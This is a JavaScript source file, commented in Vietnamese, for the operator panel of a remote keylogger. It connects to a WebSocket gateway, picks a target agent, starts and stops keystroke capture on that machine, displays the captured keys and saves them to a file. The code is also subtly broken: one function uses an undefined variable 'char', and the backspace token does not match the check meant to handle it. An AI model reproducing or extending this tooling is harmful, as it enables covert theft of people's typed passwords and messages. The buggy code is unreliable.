import * as Logic from './logic.js';

class KeyloggerUI {
    constructor() {
        // State
        this.isLogging = false;
        this.logBuffer = ""; // Biến lưu toàn bộ nội dung keylog
        this.originalOnKeylog = null; // Lưu callback gốc từ main.js

        // DOM Elements
        this.displayInput = document.getElementById('keylog-panel');
        this.btnMenu = document.querySelector('.btn-menu');
        this.btnStart = document.querySelector('.btn-start');
        this.btnStop = document.querySelector('.btn-stop');
        this.btnSave = document.querySelector('.btn-save');
        this.keys = document.querySelectorAll('.key');

        this.init();
    }

    init() {
        // Đợi window.gateway được khởi tạo từ main.js
        const waitForGateway = () => {
            if (!window.gateway) {
                setTimeout(waitForGateway, 100);
                return;
            }

            // Lưu callback gốc từ main.js và wrap nó với handler của chúng ta
            this.originalOnKeylog = window.gateway.callbacks?.onKeylog;
            
            // Override onKeylog callback để xử lý visual effects
            window.gateway.callbacks.onKeylog = (data, senderId) => {
                // Gọi handler gốc để update display (từ main.js)
                // if (this.originalOnKeylog) {
                //     this.originalOnKeylog(data, senderId);
                // }
                // Xử lý visual effects và buffer riêng của keylog.js
                this.handleIncomingKey(data, senderId);
            };

            // 2. Gán sự kiện cho các nút
            if (this.btnMenu) this.btnMenu.addEventListener('click', () => { window.location.href = 'Feature_menu.html'; });
            if (this.btnStart) this.btnStart.onclick = () => this.startKeylog();
            if (this.btnStop) this.btnStop.onclick = () => this.stopKeylog();
            if (this.btnSave) this.btnSave.onclick = () => this.saveToDevice();

            // 3. Inject CSS để phục vụ việc "nháy đèn" phím khi nhận tín hiệu
            this.injectActiveStyle();
            
            // 4. Đọc agent ID từ URL và tự động setTarget (nếu có)
            Logic.initAgentTargetFromURL();
            
            this.logSystem("Ready. Press 'Start keylog' to begin.");
        };

        waitForGateway();
    }


    // --- Command Functions ---

    startKeylog() {
        if (!window.gateway || !window.gateway.ws || window.gateway.ws.readyState !== WebSocket.OPEN) {
            alert("Chưa kết nối Gateway! Vui lòng đợi kết nối...");
            return;
        }

        if (!window.gateway.isAuthenticated) {
            Logic.authenticate();
            setTimeout(() => this.startKeylog(), 500);
            return;
        }

        this.isLogging = true;
        
        // Gửi lệnh Start Keylog. Interval 0.5s để buffer mảng cho đỡ lag network
        Logic.startKeylog(0.5);
        
        if (this.btnStart) {
            this.btnStart.style.backgroundColor = "#22c55e"; 
            this.btnStart.innerText = "Monitoring...";
        }
    }

    stopKeylog() {
        if (!window.gateway) return;

        this.isLogging = false;
        Logic.stopKeylog();
        
        if (this.btnStart) {
            this.btnStart.style.backgroundColor = ""; 
            this.btnStart.innerText = "Start keylog";
        }
    }

    // --- Core Logic: Xử lý dữ liệu nhận về ---

    /**
     * Xử lý luồng data nhận được từ Socket (Bây giờ hỗ trợ Array)
     * @param {string|string[]} data - Mảng các phím hoặc chuỗi ký tự
     */
    handleIncomingKey(data, senderId) {
        if (!this.isLogging) return;

        // --- TRƯỜNG HỢP 1: Dữ liệu là Mảng (Vector<string> từ C++) ---
        if (Array.isArray(data)) {
            data.forEach(keyToken => {
                // Chuẩn hóa token từ C++ (VD: "[ENTER]" -> "\n")
                const normalizedChar = this.normalizeKey(keyToken);
                
                // 1. Lưu buffer
                this.logBuffer += normalizedChar;
                
                // 2. Hiển thị text
                this.updateDisplay(normalizedChar);
                
                // 3. Hiệu ứng Visual
                this.visualizeKey(keyToken, normalizedChar); 
            });
            return;
        }

        // --- TRƯỜNG HỢP 2: Dữ liệu là String (Backup logic cũ) ---
        // Vẫn giữ lại Logic.processKeylogData nếu backend gửi dạng cũ hoặc message hệ thống
        const processed = Logic.processKeylogData(data, senderId);
        if (processed.processed && processed.chars) {
            processed.chars.forEach(char => {
                this.logBuffer += char;
                this.updateDisplay(char);
                this.visualizeKey(char, char);
            });
        }
    }

    /**
     * Chuyển đổi các tag đặc biệt từ C++ sang ký tự hiển thị
     */
    normalizeKey(token) {
        // Mapping các tag từ file KeyboardController.cpp
        switch (token) {
            case "[ENTER]": 
            case "\n": return "\n"; // Xuống dòng
            
            case "[TAB]": return "\t";
            
            case "[BACK]": return "Backspace"; // Dùng từ khóa này để hàm updateDisplay xử lý xóa
            
            case "[SPACE]": 
            case " ": return " ";
            
            case "[ESC]": return ""; // Không in gì cả
            case "[CTRL]": return ""; 
            
            default:
                // Nếu là format "[123]" (Unknown key code), bỏ qua hoặc in ra nguyên văn
                if (token.startsWith("[") && token.endsWith("]") && token.length > 1) {
                    return ""; // Ẩn các phím hệ thống lạ
                }
                return token; // Trả về ký tự thường (a, b, c, 1, 2...)
        }
    }

    updateDisplay(char) {
        if (!this.displayInput) return;

        if (char === '\b') {
            this.displayInput.value = this.displayInput.value.slice(0, -1);
            return;
        } else if (char === '\n' || char === '\r') {
            this.displayInput.value += "↵ "; 
        } else if (char === '\t') {
            this.displayInput.value += "→ ";
        } else if (char.length === 1 || (char.startsWith('[') && char.endsWith(']'))) {
            this.displayInput.value += char;
        }
        
        this.displayInput.scrollLeft = this.displayInput.scrollWidth;
    }

    /**
     * Tìm phím trên bàn phím ảo và nháy đèn
     * @param {string} rawToken - Token gốc từ C++ (VD: "[ENTER]")
     * @param {string} displayChar - Ký tự hiển thị (VD: "\n")
     */
    visualizeKey(rawToken, displayChar) {
        let targetKey = null;
        const lowerChar = char.toLowerCase();

        const specialCharMap = {
            '\n': 'enter',
            '\r': 'enter',
            ' ': 'space',
            '\t': 'tab'
        };

        const bracketMap = {
            '[return]': 'enter',
            '[tab]': 'tab',
            '[delete]': 'backspace',
            '[del]': 'del',
            '[esc]': 'esc',
            '[cmd]': 'win',
            '[caps]': 'caps',
            '[opt]': 'alt',
            '[ctrl]': 'ctrl',
            '[left]': '<-',
            '[right]': '->',
            '[up]': '↑',
            '[down]': '↓',
            '[home]': 'hm',
            '[end]': 'end',
            '[pgup]': 'pup',
            '[pgdn]': 'pdn',
            '[ins]': 'ins',
            '[f1]': 'f1',
            '[f2]': 'f2',
            '[f3]': 'f3',
            '[f4]': 'f4',
            '[f5]': 'f5',
            '[f6]': 'f6',
            '[f7]': 'f7',
            '[f8]': 'f8',
            '[f9]': 'f9',
            '[f10]': 'f10',
            '[f11]': 'f11',
            '[f12]': 'f12',
            '[f13]': 'prt',
            '[f14]': 'scr',
            '[f15]': 'pau',
            '[numlock]': 'num',
            '[shift]': 'shift',
            '[fn]': 'fn',
            '[alt]': 'alt'
        };

        let searchText = null;
        
        if (char.startsWith('[') && char.endsWith(']')) {
            searchText = bracketMap[lowerChar];
        } else if (specialCharMap[char]) {
            searchText = specialCharMap[char];
        } else {
            searchText = lowerChar;
        }

        if (!searchText) return; // Không tìm thấy mapping

        for (let key of this.keys) {
            // Lấy text hiển thị trên phím hoặc class đặc biệt
            let keyText = key.innerText.toLowerCase().trim();
            
            if (searchText === 'space' && keyText === '' && key.classList.contains('k-6-25')) {
                targetKey = key;
                break;
            }

            if (keyText === searchText) {
                targetKey = key;
                break;
            }
        }

        // Kích hoạt hiệu ứng
        if (targetKey) {
            // Reset animation cũ nếu đang chạy
            targetKey.classList.remove('active-simulation');
            void targetKey.offsetWidth; // Trigger reflow

            targetKey.classList.add('active-simulation');
            setTimeout(() => {
                targetKey.classList.remove('active-simulation');
            }, 200);
        }
    }

    // --- File Operations (Giữ nguyên) ---

    saveToDevice() {
        if (!this.logBuffer) {
            alert("Chưa có dữ liệu để lưu!");
            return;
        }

        const blob = new Blob([this.logBuffer], { type: "text/plain" });
        const url = URL.createObjectURL(blob);
        const a = document.createElement("a");
        
        const timestamp = new Date().toISOString().replace(/[:.]/g, "-");
        a.href = url;
        a.download = `keylog_${timestamp}.txt`;
        document.body.appendChild(a);
        a.click();
        
        document.body.removeChild(a);
        URL.revokeObjectURL(url);

        this.logBuffer = "";
        if (this.displayInput) {
            this.displayInput.value = "";
        }

        this.logSystem(">>> Log saved & cleared.");
    }

    // --- Helpers ---

    logSystem(msg) {
        console.log(`[KeylogUI] ${msg}`);
    }

    injectActiveStyle() {
        const style = document.createElement('style');
        style.innerHTML = `
            .key.active-simulation {
                background-color: #E57D36 !important;
                color: #fff !important;
                transform: translateY(2px);
                box-shadow: 0 0 10px rgba(229, 125, 54, 0.5) !important;
                transition: all 0.05s ease;
                border-color: #E57D36 !important;
            }
        `;
        document.head.appendChild(style);
    }
}

// Khởi chạy khi DOM load xong
document.addEventListener('DOMContentLoaded', () => {
    window.keyloggerApp = new KeyloggerUI();
});